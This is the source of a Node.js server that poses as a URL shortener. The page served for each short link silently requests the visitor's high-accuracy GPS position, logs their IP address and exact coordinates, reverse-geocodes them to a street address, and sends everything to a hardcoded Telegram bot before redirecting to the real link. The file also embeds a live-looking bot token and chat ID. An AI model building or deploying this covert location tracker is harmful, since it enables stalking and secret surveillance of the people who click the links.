const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: 'text/plain', limit: '10mb' }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );
      return true;
    } catch (err) {
      if (i < retries - 1) await new Promise(r => setTimeout(r, 500));
    }
  }
  return false;
}

async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { timeout: 3000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
    );
    if (res.data && res.data.address) {
      return res.data.display_name || 'Unknown Location';
    }
  } catch (e) {}
  return null;
}

function safeParseBody(req) {
  if (typeof req.body === 'string') {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return req.body || {};
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  let normalizedUrl = url.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = 'https://' + normalizedUrl;
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: normalizedUrl, created: new Date(), clicks: 0 };

  res.json({
    shortened: `${BASE_URL}/${shortCode}`,
    code: shortCode
  });
});

app.post('/api/log-gps', async (req, res) => {
  const body = safeParseBody(req);
  const { code, latitude, longitude, accuracy } = body;

  if (!code || !linkStorage[code]) {
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
  linkStorage[code].clicks++;

  let address = null;
  if (latitude && longitude) {
    address = await reverseGeocode(latitude, longitude);
  }

  let msg = `🎯 <b>موقع دقيق!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
  msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
  msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
  msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━\n\n`;

  if (latitude && longitude) {
    msg += `<b>✅ 📍 GPS Coordinates</b>\n`;
    msg += `📍 <code>${latitude}, ${longitude}</code>\n`;
    msg += `📏 دقة: ±${accuracy.toFixed(0)} متر\n`;
    msg += `🗺️ <a href="https://maps.google.com/?q=${latitude},${longitude}">Maps</a>\n`;
    
    if (address) {
      msg += `\n<b>📮 العنوان:</b>\n${address}\n`;
    }
  } else {
    msg += `<b>❌ بدون GPS</b>\nالمستخدم رفض السماح بالموقع`;
  }

  await sendToTelegram(msg);
  res.json({ success: true });
});

app.get('/api/test', async (req, res) => {
  const ok = await sendToTelegram('🔗 اختبار ✅');
  res.json({ telegram: ok ? 'sent' : 'failed' });
});

app.use(express.static('.'));

app.get('/:code', (req, res) => {
  const { code } = req.params;

  if (!linkStorage[code]) {
    return res.status(404).send('<h1>Not found</h1>');
  }

  const originalUrl = linkStorage[code].original;

  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; padding: 0; background: #000; }
  </style>
</head>
<body>
  <script>
    const code = ${JSON.stringify(code)};
    const originalUrl = ${JSON.stringify(originalUrl)};
    const apiUrl = '${BASE_URL}/api/log-gps';

    function go() {
      window.location.href = originalUrl;
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              code: code,
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            }),
            keepalive: true
          }).finally(go);
        },
        () => {
          fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: code, latitude: null, longitude: null, accuracy: null }),
            keepalive: true
          }).finally(go);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      go();
    }
  </script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});